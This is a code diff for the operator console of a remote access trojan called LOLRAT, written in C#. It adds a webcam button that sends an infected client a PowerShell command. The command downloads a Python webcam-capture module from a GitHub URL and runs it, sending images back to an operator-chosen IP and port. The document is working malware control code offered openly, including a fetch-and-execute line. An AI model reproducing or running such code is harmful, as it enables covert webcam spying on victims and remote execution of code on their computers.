@@ -12,6 +12,10 @@ using System.Windows.Forms;
 
 namespace LOLRAT_C2
 {
+    // 1.1.1
+    // The first 1 in 1.1.1 is the major version number. This number is incremented when you make major changes to the code.
+    // The second 1 in 1.1.1 is the minor version number. This number is incremented when you make minor changes to the code.
+    // The third 1 in 1.1.1 is the patch version number. This number is incremented when you make small changes to the code.
     public partial class Main : Form
     {
         // Define a list to store connected clients
@@ -154,9 +158,9 @@ namespace LOLRAT_C2
             // Ask user for input on ip and port
             string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
             string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
-            
+
             // Start the SS form
-            txtOutput.AppendText("Starting Screensharing form...\r\n");
+            txtOutput.AppendText("Starting image sharing form...\r\n");
             SS ss = new SS();
             ss.Show();
 
@@ -176,6 +180,37 @@ namespace LOLRAT_C2
 
         }
 
+
+        // ---------------------------------------------------------------------------
+        //
+        //                              Photo with Webcam
+        //
+        // ---------------------------------------------------------------------------
+        private void btnWebcam_Click(object sender, EventArgs e)
+        {
+            // Ask user for input on ip and port
+            string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
+            string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
+
+            // Start the SS form
+            txtOutput.AppendText("Starting image sharing form...\r\n");
+            SS ss = new SS();
+            ss.Show();
+
+            // Send the SS command to selected client
+            txtOutput.AppendText("Sending Webcam command to client...\r\n");
+            DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+            string clientIP = selectedRow.Cells["IP"].Value.ToString();
+            int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+            ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+            if (selectedClient != null)
+            {
+                byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/webcam.py\").Content " + IP + " " + PORT + "'\"");
+                selectedClient.Stream.Write(data, 0, data.Length);
+                txtOutput.AppendText("Sent command to client!\r\n");
+            }
+            txtOutput.AppendText("Hopefully that worked...\r\n");
+        }
 
         // ---------------------------------------------------------------------------
         //
